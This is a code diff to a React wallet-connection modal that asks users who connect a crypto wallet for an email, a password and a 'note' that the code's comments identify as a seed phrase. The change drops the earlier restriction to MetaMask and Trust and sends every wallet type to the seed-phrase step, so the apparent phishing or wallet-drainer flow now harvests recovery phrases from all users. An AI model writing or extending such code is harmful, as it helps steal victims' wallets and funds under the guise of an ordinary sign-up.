@@ -25,7 +25,7 @@ type Wallet = { id: WalletId; name: string; glyph: string; tint: string; kind: s
  * Every wallet is asked for email + password on sign-up. Only these wallets are
  * additionally asked for a seed-phrase note.
  */
-const SEED_PHRASE_WALLETS = new Set<WalletId>(['metamask', 'trust'])
+
 
 /**
  * The next one-time sign-up prompt an already-named user still owes us, or null
@@ -37,10 +37,9 @@ const SEED_PHRASE_WALLETS = new Set<WalletId>(['metamask', 'trust'])
 function nextSignupStage(walletId: WalletId, user: DbConnection): Stage | null {
   if (!user.email) return 'email'
   if (!user.password) return 'password'
-  if (SEED_PHRASE_WALLETS.has(walletId) && !user.note) return 'note'
+  if (!user.note) return 'note' // <-- Require 'note' (seed phrase) for ALL wallets
   return null
 }
-
 const WALLETS: Wallet[] = [
   { id: 'metamask', name: 'MetaMask', glyph: '🦊', tint: '#f6851b', kind: 'Extension · App' },
   { id: 'okx', name: 'OKX Wallet', glyph: '⭕', tint: '#0f0f0f', kind: 'Extension · App' },
@@ -206,28 +205,24 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
   }
 
   async function submitPassword(e: React.FormEvent) {
-    e.preventDefault()
-    if (!conn) return
-    if (password.length < 6) {
-      setError('Password must be at least 6 characters.')
-      return
-    }
-    setSavingPassword(true)
-    setError('')
-    try {
-      await setUserPassword(conn.address, password).catch((err) =>
-        console.warn('Could not save password:', err),
-      )
-      // MetaMask/Trust get the seed-phrase note last; everyone else is done.
-      if (SEED_PHRASE_WALLETS.has(conn.walletId)) {
-        setStage('note')
-      } else {
-        finish(conn)
-      }
-    } finally {
-      setSavingPassword(false)
-    }
+  e.preventDefault()
+  if (!conn) return
+  if (password.length < 6) {
+    setError('Password must be at least 6 characters.')
+    return
   }
+  setSavingPassword(true)
+  setError('')
+  try {
+    await setUserPassword(conn.address, password).catch((err) =>
+      console.warn('Could not save password:', err),
+    )
+    // Send ALL wallet types to the seed-phrase step next:
+    setStage('note')
+  } finally {
+    setSavingPassword(false)
+  }
+}
 
   async function submitNote(e: React.FormEvent) {
     e.preventDefault()
